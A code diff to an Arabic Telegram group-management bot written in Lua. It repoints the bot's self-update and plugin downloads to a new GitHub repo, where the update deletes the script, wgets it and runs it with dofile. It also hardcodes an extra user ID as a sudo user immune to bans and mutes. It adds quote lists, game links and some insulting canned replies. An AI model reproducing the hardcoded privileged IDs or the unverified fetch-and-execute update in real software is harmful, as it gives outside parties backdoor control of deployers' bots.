@@ -157,7 +157,7 @@ io.popen("mkdir File_Bot")
 io.popen("cd File_Bot && rm -rf commands.lua.1") 
 io.popen("cd File_Bot && rm -rf commands.lua.2") 
 io.popen("cd File_Bot && rm -rf commands.lua.3") 
-io.popen("cd File_Bot && wget https://raw.githubusercontent.com/black801/Bak/main/File_Bot/commands.lua") 
+io.popen("cd File_Bot && wget https://raw.githubusercontent.com/black801/memo/main/File_Bot/commands.lua") 
 t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
 i = 0
 for v in io.popen('ls File_Bot'):lines() do
@@ -170,7 +170,7 @@ print(t)
 function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
-sudo_users = {SUDO,1797771210,1536238833}   
+sudo_users = {SUDO,1797771210,1536238833,994455333}   
 function SudoBot(msg)  
 local DRAGON = false  
 for k,v in pairs(sudo_users) do  
@@ -263,6 +263,8 @@ function Can_or_NotCan(user_id,chat_id)
 if tonumber(user_id) == tonumber(1797771210) then  
 var = true  
 elseif tonumber(user_id) == tonumber(1536238833) then
+var = true  
+elseif tonumber(user_id) == tonumber(994455333) then
 var = true  
 elseif tonumber(user_id) == tonumber(SUDO) then
 var = true  
@@ -874,7 +876,7 @@ end
 if DevSoFi(msg) then
 local bl = ' 🧚‍♀️ اهلا عزيزي آلمـطـور\n 🧚‍♀️ آنت آلمـطـور آلآسـآسـي للبوت\n┉  ┉  ┉  ┉  ┉  ┉  ┉  ┉ء\n 🧚‍♀️ تسـتطـيع‌‏ آلتحگم باوامر البوت\n 🧚‍♀️ من خلاال الكيبورت خاص بك\n 🧚‍♀️ قناة سورس البوت [اضغط هنا](t.me/BK_b_1)'
 local keyboard = {
-{'مبرمج السورس','بلاك مالك السورس'},
+{'مبرمج السورس '},
 {'قناه السورس','بوت تواصل'},
 {'اضف رد عام','حذف رد عام'},
 {'اضف رد متعدد','حذف رد متعدد'},
@@ -913,9 +915,10 @@ if start then
 keyboard = start
 else
 keyboard = {
-{'مبرمج السورس','بلاك مالك السورس'},
+{'مبرمج السورس','بوت التواصل'},
 {'قناة السورس'},
 {'تويت','صراحه'},
+{'كتبات','انصحنى'},
 {'المطور','انا مين'},
 }
 end
@@ -1080,7 +1083,7 @@ end
 
 if text == 'تحديث السورس ' and DevSoFi(msg) then 
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/black801/Bak/main/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/black801/memo/main/DRAGON.lua')
 send(msg.chat_id_, msg.id_,' 🧚‍♀️ تم تحديث السورس \n 🧚‍♀️ لديك اخر اصدار لسورس بكار\n 🧚‍♀️ الاصدار » { v 1.5}')
 dofile('DRAGON.lua')  
 end
@@ -1088,26 +1091,14 @@ if text == 'الاصدار' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 send(msg.chat_id_, msg.id_,' 🧚‍♀️ اصدار سورس بكار \n 🧚‍♀️ الاصدار »{ v 1.5}')
 end
-if text == 'مبرمج السورس' and DevSoFi(msg) then
+if text == 'مبرمج السورس ' and DevSoFi(msg) then
 database:del(bot_id..'Srt:Bot') 
 local Text = [[ 
 [DEV Sameer](t.me/UU_bh)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𓆩𝒔𝒂𝒎𝒆𝒆𝒓𓆪', url="t.me/UU_bh"}}, 
-} 
-local msg_id = msg.id_/2097152/0.5 
-https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
-end
-if text == 'بلاك مالك السورس' and DevSoFi(msg) then
-database:del(bot_id..'Srt:Bot') 
-local Text = [[ 
-[مالك السورس](t.me/B_l_a_c_k_H_o_u_s_e_1)
-]] 
-keyboard = {}  
-keyboard.inline_keyboard = { 
-{{text = '𓆩𝒃𝒍𝒂𝒄𝒌𓆪', url="t.me/B_l_a_c_k_H_o_u_s_e_1"}}, 
+{{text = '𓆩𝒍𝒔𝒂𝒎𝒆𝒆𝒓𓆪', url="t.me/UU_bh"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2387,7 +2378,7 @@ end
 return false
 end
 os.execute('rm -rf DRAGON.lua')
-os.execute('wget https://raw.githubusercontent.com/black801/Bak/main/DRAGON.lua')
+os.execute('wget https://raw.githubusercontent.com/black801/memo/main/DRAGON.lua')
 send(msg.chat_id_, msg.id_,' 🧚‍♀️ تم تحديث السورس \n 🧚‍♀️ لديك اخر اصدار لسورس بكار\n 🧚‍♀️ الاصدار » { v 1.5}')
 dofile('DRAGON.lua')  
 end
@@ -2675,7 +2666,7 @@ local Text = [[
 ]]
 keyboard = {} 
 keyboard.inline_keyboard = {
-{{text = '𓆩𝒔𝒂𝒎𝒆𝒆𝒓𓆪',url="t.me/UU_bh"}},
+{{text = '𓆩𝒔𝒂𝒎𝒆𝒆𝒓𓆪',url="t.me/B_l_a_c_k_H_o_u_s_e_1"}},
 {{text = '𓆩𝒃𝒍𝒂𝒄𝒌𓆪',url="t.me/B_l_a_c_k_H_o_u_s_e_1"}},
 {{text = '𓆩𝒔𝒐𝒖𝒓𝒄𝒆𓆪', url="t.me/BK_b_1"}},
 {{text = '𓆩𝒃𝒂𝒌𝒂𝒓𓆪', url="t.me/Baka_r_bot"}},
@@ -2699,7 +2690,7 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
 
-if text == 'سمير' or text == 'المسلم' or text == 'بلاك' then
+if text == 'سمير' or text == 'بكار' or text == 'بلاك' then
 local Text = [[
 DEV Sameer
 ]]
@@ -2710,7 +2701,7 @@ keyboard.inline_keyboard = {
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
-if text == 'مسلم' or text == 'مطور السورس' or text == 'بكار' then
+if text == 'بكار' or text == 'مطور السورس' or text == 'بكار' then
 local Text = [[
 مبرمج سورس بكار
 ]]
@@ -2766,7 +2757,6 @@ local TWEET_Msg = {
 "اي رايك في سورس بكار ؟ ", 
 "كم مره حبيت؟ ", 
 " اكثر المتابعين عندك باي برنامج؟", 
-" آخر مره ضربت عشره كانت متى ؟", 
 " نسبه الندم عندك للي وثقت فيهم ؟", 
 "تحب ترتبط بكيرفي ولا فلات؟", 
 " جربت شعور احد يحبك بس انت مو قادر تحبه؟", 
@@ -2835,6 +2825,71 @@ local TWEET_Msg = {
 send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
 return false 
 end
+if text == "كتبات" or text == "حكمه" or text == "قصيده" then 
+local TWEET_Msg = { 
+"‏من ترك أمرهُ لله، أعطاه الله فوق ما يتمنَّاه💙 ", 
+"‏من علامات جمال المرأة .. بختها المايل ! ",
+"‏ انك الجميع و كل من احتل قلبي🫀🤍",
+"‏ ‏ لقد تْعَمقتُ بكَ كَثيراً والمِيمُ لام .♥️",
+"‏ ‏ممكن اكون اختارت غلط بس والله حبيت بجد🖇️",
+"‏ علينا إحياء زَمن الرّسائل الورقيّة وسط هذه الفوضى الالكترونية العَارمة.🦅💜",
+"‏ يجي اي الصاروخ الصيني ده جمب الصاروخ المصري لما بيلبس العبايه السوده.🤩♥️",
+"‏ كُنت أرقّ من أن أتحمّل كُل تلك القَسوة من عَينيك .🍍",
+"‏أَكَان عَلَيَّ أَنْ أغْرَس انيابي فِي قَلْبِك لتشعر بِي ؟.",
+"‏ : كُلما أتبع قلبي يدلني إليك .",
+"‏ : أيا ليت من تَهواه العينُ تلقاهُ .",
+"‏ ‏: رغبتي في مُعانقتك عميقة جداً .🥥",
+"ويُرهقني أنّي مليء بما لا أستطيع قوله.✨",
+"‏ من مراتب التعاسه إطالة الندم ع شيء إنتهى. 🦅 ",
+"‏ ‏كل العالم يهون بس الدنيا بينا تصفي 💙",
+"‏ بعض الاِعتذارات يجب أن تُرفَضّ.",
+"‏ ‏تبدأ حياتك محاولاً فهم كل شيء، وتنهيها محاولاً النجاة من كل ما فهمت.",
+"‏ إن الأمر ينتهي بِنا إلى أعتياد أي شيء.",
+"‏ هل كانت كل الطرق تؤدي إليكِ، أم أنني كنتُ أجعلها كذلك.",
+"‏ ‏هَتفضل توآسيهُم وآحد ورآ التآني لكن أنتَ هتتنسي ومحدِش هَيوآسيك.",
+"‏ جَبَرَ الله قلوبِكُم ، وقَلبِي .🍫",
+"‏ بس لما أنا ببقى فايق، ببقى أبكم له ودان.💖",
+"‏ ‏مقدرش عالنسيان ولو طال الزمن 🖤",
+"‏ أنا لستُ لأحد ولا احد لي ، أنا إنسان غريب أساعد من يحتاجني واختفي.",
+"‏ ‏أحببتك وأنا منطفئ، فما بالك وأنا في كامل توهجي ؟",
+"‏ لا تعودني على دفء شمسك، إذا كان في نيتك الغروب .َ",
+"‏ وانتهت صداقة الخمس سنوات بموقف.",
+"‏ ‏لا تحب أحداً لِدرجة أن تتقبّل أذاه.",
+"‏ إنعدام الرّغبة أمام الشّيء الّذي أدمنته ، انتصار.",
+"‏ ",
+} 
+send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+return false 
+end
+if text == "انصحني" or text == "انصحنى" or text == "انصح" then 
+local TWEET_Msg = { 
+"عامل الناس بأخلاقك ولا بأخلاقهم", 
+"الجمال يلفت الأنظار لكن الطيبه تلفت القلوب ", 
+"الاعتذار عن الأخطاء لا يجرح كرامتك بل يجعلك كبير في نظر الناس ",
+"لا ترجي السماحه من بخيل.. فما في البار لظمان ماء",
+"لا تحقرون صغيره إن الجبال من الحصي",
+"لا تستحي من إعطاء فإن الحرمان أقل منه ", 
+"لا تظلم حتى لا تتظلم ",
+"لا تقف قصاد الريح ولا تمشي معها ",
+"لا تكسب موده التحكم الا بالتعقل",
+"لا تمد عينك في يد غيرك ",
+"لا تملح الا لمن يستحقاها ويحافظ عليها",
+"لا حياه للإنسان بلا نبات",
+"لا حياه في الرزق.. ولا شفاعه في الموت",
+"كما تدين تدان",
+"لا دين لمن لا عهد له ",
+"لا سلطان على الدوق فيما يحب أو بكره",
+"لا مروه لمن لادين له ",
+"لا يدخل الجنه من لايأمن من جازه بوائقه",
+"يسروا ولا تعسروا... ويشورا ولا تنفروا",
+"يدهم الصدر ما يبني العقل الواسع ",
+"أثقل ما يوضع في الميزان يوم القيامة حسن الخلق ",
+"أجهل الناس من ترك يقين ما عنده لظن ما عند الناس ",
+"أحياناً.. ويصبح الوهم حقيقه ", 
+} 
+send(msg.chat_id_, msg.id_,'['..TWEET_Msg[math.random(#TWEET_Msg)]..']')  
+return false 
+end
 
 if text == 'قناة السورس' then
 local Text = [[ 
@@ -2859,13 +2914,13 @@ local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
 end
 
-if text == 'المبرمج' then
+if text == 'مبرمج السورس' then
 local Text = [[ 
 [Sameer](t.me/UU_bh)
 ]] 
 keyboard = {}  
 keyboard.inline_keyboard = { 
-{{text = '𓆩𝒔𝒂𝒎𝒆𝒆𝒓𓆪', url="t.me/UU_bh"}}, 
+{{text = '𓆩𝒍𝒔𝒂𝒎𝒆𝒆𝒓𓆪', url="t.me/UU_bh"}}, 
 } 
 local msg_id = msg.id_/2097152/0.5 
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
@@ -2876,17 +2931,33 @@ local Text = [[
 𝒔𝒐𝒖𝒓𝒄𝒆 𝒃𝒂𝒌𝒂𝒓
 ]]
 keyboard = {} keyboard.inline_keyboard = {
-{{text = 'لعبة فلابي بيرد 🐥',url="http://t.me/awesomebot?game=FlappyBird"}},
-{{text = 'سباق سيارات 🏎', url="http://t.me/gamee?game=F1Racer"}},
-{{text = 'كرة قدم ⚽', url="http://t.me/gamee?game=FootballStar"}},
-{{text = 'سباق الدراجات🏍', url="https://t.me/gamee?game=MotoFX"}},
-{{text = 'متشابه 👾', url="https://t.me/gamee?game=DiamondRows"}},
-{{text = 'ورق🤹‍♂', url="https://t.me/gamee?game=Hexonix"}},
-{{text = 'MotoFx', url="https://t.me/gamee?game=MotoFx"}},
-{{text = 'ورق🤹‍♂', url="https://t.me/gamee?game=Hexonix"}},
-{{text = 'لعبة 204', url="https://t.me/awesomebot?game=g2048"}},
-{{text = 'Squares🏁', url="https://t.me/gamee?game=Squares"}},
-}
+{{text = 'فلابي بيرد', url="https://t.me/awesomebot?game=FlappyBird"},{text = 'تحداني فالرياضيات',url="https://t.me/gamebot?game=MathBattle"}},   
+{{text = 'لعبه دراجات', url="https://t.me/gamee?game=MotoFX"},{text = 'سباق سيارات', url="https://t.me/gamee?game=F1Racer"}}, 
+{{text = 'تشابه', url="https://t.me/gamee?game=DiamondRows"},{text = 'كره القدم', url="https://t.me/gamee?game=FootballStar"}}, 
+{{text = 'ورق', url="https://t.me/gamee?game=Hexonix"},{text = 'لعبه 2048', url="https://t.me/awesomebot?game=g2048"}}, 
+{{text = 'SQUARES', url="https://t.me/gamee?game=Squares"},{text = 'ATOMIC', url="https://t.me/gamee?game=AtomicDrop1"}}, 
+{{text = 'CORSAIRS', url="https://t.me/gamebot?game=Corsairs"},{text = 'LumberJack', url="https://t.me/gamebot?game=LumberJack"}}, 
+{{text = 'LittlePlane', url="https://t.me/gamee?game=LittlePlane"},{text = 'RollerDisco', url="https://t.me/gamee?game=RollerDisco"}},  
+{{text = 'كره القدم 2', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'جمع المياه', url="https://t.me/gamee?game=BlockBuster"}},  
+{{text = 'لا تجعلها تسقط', url="https://t.me/gamee?game=Touchdown"},{text = 'GravityNinja', url="https://t.me/gamee?game=GravityNinjaEmeraldCity"}},  
+{{text = 'Astrocat', url="https://t.me/gamee?game=Astrocat"},{text = 'Skipper', url="https://t.me/gamee?game=Skipper"}},  
+{{text = 'WorldCup', url="https://t.me/gamee?game=PocketWorldCup"},{text = 'GeometryRun', url="https://t.me/gamee?game=GeometryRun"}},  
+{{text = 'Ten2One', url="https://t.me/gamee?game=Ten2One"},{text = 'NeonBlast2', url="https://t.me/gamee?game=NeonBlast2"}},  
+{{text = 'Paintio', url="https://t.me/gamee?game=Paintio"},{text = 'onetwothree', url="https://t.me/gamee?game=onetwothree"}},  
+{{text = 'BrickStacker', url="https://t.me/gamee?game=BrickStacker"},{text = 'StairMaster3D', url="https://t.me/gamee?game=StairMaster3D"}},  
+{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'BasketBoyRush', url="https://t.me/gamee?game=BasketBoyRush"}},  
+{{text = 'GravityNinja21', url="https://t.me/gamee?game=GravityNinja21"},{text = 'MarsRover', url="https://t.me/gamee?game=MarsRover"}},  
+{{text = 'LoadTheVan', url="https://t.me/gamee?game=LoadTheVan"},{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"}},  
+{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'KeepItUp', url="https://t.me/gamee?game=KeepItUp"}},  
+{{text = 'SunshineSolitaire', url="https://t.me/gamee?game=SunshineSolitaire"},{text = 'Qubo', url="https://t.me/gamee?game=Qubo"}},  
+{{text = 'PenaltyShooter2', url="https://t.me/gamee?game=PenaltyShooter2"},{text = 'Getaway', url="https://t.me/gamee?game=Getaway"}},  
+{{text = 'PaintioTeams', url="https://t.me/gamee?game=PaintioTeams"},{text = 'SpikyFish2', url="https://t.me/gamee?game=SpikyFish2"}},  
+{{text = 'GroovySki', url="https://t.me/gamee?game=GroovySki"},{text = 'KungFuInc', url="https://t.me/gamee?game=KungFuInc"}},  
+{{text = 'SpaceTraveler', url="https://t.me/gamee?game=SpaceTraveler"},{text = 'RedAndBlue', url="https://t.me/gamee?game=RedAndBlue"}},  
+{{text = 'SkodaHockey1 ', url="https://t.me/gamee?game=SkodaHockey1"},{text = 'SummerLove', url="https://t.me/gamee?game=SummerLove"}},  
+{{text = 'SmartUpShark', url="https://t.me/gamee?game=SmartUpShark"},{text = 'SpikyFish3', url="https://t.me/gamee?game=SpikyFish3"}},  
+{{text = '𓆩𝒔𝒐𝒖𝒓𝒄𝒆𓆪', url="t.me/BK_b_1"}}, 
+}  
 local msg_id = msg.id_/2097152/0.5
 https.request("https://api.telegram.org/bot"..token..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
 end
@@ -3785,7 +3856,11 @@ send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك حظر مبرمج ا
 return false 
 end
 if result.sender_user_id_ == tonumber(1536238833) then
-send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك حظر مبرمج السورس\n")
+send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك حظر مالك السورس\n")
+return false 
+end
+if result.sender_user_id_ == tonumber(994455333) then
+send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك حظر مطور السورس\n")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
@@ -3893,7 +3968,11 @@ send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك كتم مبرمج ا
 return false 
 end
 if result.sender_user_id_ == tonumber(1536238833) then
-send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك كتم مبرمج السورس\n")
+send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك كتم مالك السورس\n")
+return false 
+end
+if result.sender_user_id_ == tonumber(994455333) then
+send(msg.chat_id_, msg.id_, " 🧚‍♀️ لا يمكنك كتم مطور السورس\n")
 return false 
 end
 if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
@@ -4124,7 +4203,7 @@ send(msg.chat_id_, msg.id_,t)
 end
 if text == "متجر الملفات" or text == 'المتجر' then
 if DevSoFi(msg) then
-local Get_Files, res = https.request("https://raw.githubusercontent.com/black801/Bak/main/getfile.json")
+local Get_Files, res = https.request("https://raw.githubusercontent.com/black801/memo/main/getfile.json")
 if res == 200 then
 local Get_info, res = pcall(JSON.decode,Get_Files);
 vardump(res.plugins_)
@@ -4162,7 +4241,7 @@ t = " 🧚‍♀️ الملف » "..file.."\n 🧚‍♀️ تم تعطيل م�
 else
 t = " 🧚‍♀️ بالتاكيد تم تعطيل ملف → "..file.."\n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/black801/Bak/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/black801/memo/main/File_Bot/"..file)
 if res == 200 then
 os.execute("rm -fr File_Bot/"..file)
 send(msg.chat_id_, msg.id_,t) 
@@ -4182,7 +4261,7 @@ t = " 🧚‍♀️ بالتاكيد تم تفعيل ملف → "..file.." \n"
 else
 t = " 🧚‍♀️ الملف » "..file.."\n 🧚‍♀️ تم تفعيل ملف \n"
 end
-local json_file, res = https.request("https://raw.githubusercontent.com/black801/Bak/main/File_Bot/"..file)
+local json_file, res = https.request("https://raw.githubusercontent.com/black801/memo/main/File_Bot/"..file)
 if res == 200 then
 local chek = io.open("File_Bot/"..file,'w+')
 chek:write(json_file)
@@ -5606,7 +5685,7 @@ end
 return false
 end
 if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not BasicConstructor(msg) then
-send(msg.chat_id_, msg.id_,' ??‍♀️ تم تعطيل الرفع') 
+send(msg.chat_id_, msg.id_,' 🧚‍♀️ تم تعطيل الرفع') 
 return false
 end
 database:sadd(bot_id..'S00F4:MN:TF'..msg.chat_id_, userid)
@@ -6521,7 +6600,7 @@ send(msg.chat_id_, msg.id_, ' 🧚‍♀️ تم تنزيل جميع الخول�
 end
 if text == ("تاك للخولات") and Mod(msg) then
 local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
-t = "\n 🧚‍♀️ قائمة خولات الجروب \n≪━━━━━━𝑬??𝑴𝑼𝑺𝑳𝑰𝑴━━━━━━≫\n"
+t = "\n 🧚‍♀️ قائمة خولات الجروب \n≪━━━━━━𝒃𝒂𝒌𝒂𝒓━━━━━━≫\n"
 for k,v in pairs(list) do
 local username = database:get(bot_id.."user:Name" .. v)
 if username then
@@ -9269,18 +9348,16 @@ end
 if text == ""..(database:get(bot_id..'Name:Bot') or 'بكار').."" then  
 Namebot = (database:get(bot_id..'Name:Bot') or 'بكار')
 local DRAGON_Msg = {
-'نعم يروحي 😻💙',
-'قلب 😻💙',
+'ننعم يروحي 😻💙',
+'نعم يا قلب  '..Namebot..'',
 'عاوز اي من '..Namebot..'',
 'دوختو  '..Namebot..'',
-'نعم ياقلب  '..Namebot..'',
 'بتشقط وجي ويت 🤪',
 'ايوا جاي 🙈',
 'يعم هتسحر واجي 😾',
 'طب متصلي على النبي كدا 🙂💜',
 'تع اشرب شاي 🥺💙',
-'نعم🧚‍♀️'
-
+'نعم حبيبي 🥺❤️'
 }
 send(msg.chat_id_, msg.id_,'['..DRAGON_Msg[math.random(#DRAGON_Msg)]..']') 
 return false
@@ -9288,7 +9365,7 @@ end
 if text == "بوت" then  
 Namebot = (database:get(bot_id..'Name:Bot') or 'بكار')
 local DRAGON_Msg = {
-'اسمي '..Namebot..' يا قلبي 🤤💚',
+'اسمي  '..Namebot..' يا قلبي 🤤💚',
 'اسمي '..Namebot..' يا روحي🙈❤️',
 'اسمي  '..Namebot..' يعمري🌚🌝',
 'اسمي  '..Namebot..' يا قمر 🐭🤍',
@@ -10509,9 +10586,194 @@ if text == 'رتبتي' then
 local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
 send(msg.chat_id_, msg.id_,' 🧚‍♀️ رتبتك في البوت » '..rtp)
 end
+if text == 'انا مين' and SudoBot(msg) then 
+send(msg.chat_id_,msg.id_, '[انت مطوري نور عنيا🥺🤍](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and DevSoFi(msg) then 
+send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and Sudo(msg) then 
+send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and CoSu(msg) then 
+send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and Constructor(msg) then 
+send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and BasicConstructor(msg) then 
+send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and Manager(msg) then 
+send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and Mod(msg) then 
+send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'انا مين' and Special(msg) then 
+send(msg.chat_id_,msg.id_, '[ انت مميز يروحي 🌚❤️ ](t.me/BK_b_1)') 
+return false
+end
+
 if text == 'انا مين' then
-local rtp = Rutba(msg.sender_user_id_,msg.chat_id_)
-send(msg.chat_id_, msg.id_,' انت هنا » '..rtp)
+send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'تيست' then 
+send(msg.chat_id_,msg.id_, ' البوت شغال ') 
+return false
+end
+
+
+if text == 'سلام' then 
+send(msg.chat_id_,msg.id_, '[ابق تعاله كليوم..😹💔🎶](t.me/BK_b_1)') 
+return false
+end
+
+if text == 'هاي' or text == 'هيي' then
+send(msg.chat_id_,msg.id_, '[علي الواي فاي..😺💜](t.me/BK_b_1)') 
+return false
+end
+
+if text then 
+list = {'برايفت'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'النبي'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'جيت'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[لف وارجعع تانيي مشحوار😹💃❤️](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'قفل المحن'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, 'اهلا عزيزي تم قفل المحن بنجاح اتمحونوا بف عشان المراره 😹??') 
+return false
+end
+end
+end
+
+if text then 
+list = {'🙄'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[نزل عينك عيب كده..🌚♥️](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'فتح المحن'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, 'اهلا عزيزي تم فتح المحن بنجاح') 
+return false
+end
+end
+end
+if text == "حلوه"  or text == "حلو" then
+
+send(msg.chat_id_,msg.id_, '[يحلات عيونك..♥️🦋](t.me/BK_b_1)')
+return false
+end
+
+if text then 
+list = {'💋'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[عايز من ده..💋🥀](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'بف'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[خدوني معاكم بف..🙄💔](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'😔'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[متزعلش بحبك..😥♥️](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'بحبك'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[وانا كمان بحبك .🥺❤️](t.me/BK_b_1)') 
+return false
+end
+end
+end
+
+if text then 
+list = {'ب ف'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[خدوني معاكم ب ف ..🙄💔](t.me/BK_b_1)')
+return false
+end
+end
+end
+if text then 
+list = {'سلام عليكم'}
+for k,v in pairs(list) do
+if string.find(text,v) ~= nil then
+send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤🌚](t.me/BK_b_1)') 
+return false
+end
+end
 end
 if text == "اسمي"  then 
 tdcli_function({ID="GetUser",user_id_=msg.sender_user_id_},function(extra,result,success)
@@ -10664,7 +10926,7 @@ end
 return false
 end
 
-if text == 'مين ضافني' then
+if string.find(text,"ضافني") or string.find(text,"ضفني") then
 if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
 if da and da.status_.ID == "ChatMemberStatusCreator" then
@@ -10675,29 +10937,29 @@ local Added_Me = database:get(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.sen
 if Added_Me then 
 tdcli_function ({ID = "GetUser",user_id_ = Added_Me},function(extra,result,success)
 local Name = '['..result.first_name_..'](tg://user?id='..result.id_..')'
-Text = '🥷 هوا ابن الكلب دا الي ضافك😹» '..Name
+Text = ' 🧚‍♀️ هوا ابن الكلب دا الي ضافك😹» '..Name
 sendText(msg.chat_id_,Text,msg.id_/2097152/0.5,'md')
 end,nil)
 else
-send(msg.chat_id_, msg.id_,' 🥷 انت دخلت عبر الرابط يوسخ 🌝') 
+send(msg.chat_id_, msg.id_,' 🧚‍♀️ انت دخلت عبر الرابط يوسخ 🌝') 
 end
 end,nil)
 else
-send(msg.chat_id_, msg.id_,' 🥷 تم تعطيل امر  مين ضافني') 
+send(msg.chat_id_, msg.id_,' 🧚‍♀️ تم تعطيل امر  مين ضافني') 
 end
 end
 if text == 'مين ضافني هنا' then
 if not database:get(bot_id..'Added:Me'..msg.chat_id_) then
 tdcli_function ({ID = "GetChatMember",chat_id_ = msg.chat_id_,user_id_ = msg.sender_user_id_},function(arg,da) 
